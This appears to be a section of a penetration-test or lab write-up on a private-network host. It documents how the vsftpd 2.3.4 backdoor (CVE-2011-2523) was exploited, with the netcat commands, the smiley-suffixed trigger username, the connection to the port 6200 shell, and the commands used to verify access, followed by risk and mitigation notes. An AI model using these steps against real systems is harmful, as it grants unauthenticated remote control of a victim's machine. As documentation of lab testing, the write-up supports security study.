### 21/tcp – FTP (vsftpd 2.3.4)

- **Vulnerability:** Contains a backdoor triggered by a specially crafted username ending in `:)` (CVE-2011-2523).  
- **Exploitation Steps:**
  1. Connected to FTP service with Netcat:  
     ```bash
     nc 192.168.56.102 21
     ```
  2. Sent username:  
     ```
     USER backdoor:)
     ```
  3. Entered a random password (connection failed normally).  
  4. Connected to backdoor shell on port 6200:  
     ```bash
     nc 192.168.56.102 6200
     ```
  5. Verified shell access by running:  
     ```bash
     whoami
     id
     ls -la /home
     uname -a
     ```
- **Result:** Successfully obtained a remote shell on the target system.  
- **Risk:** Allows unauthenticated remote access with full system control.  
- **Mitigation:** Upgrade vsftpd to a secure version and monitor FTP services for unusual behavior.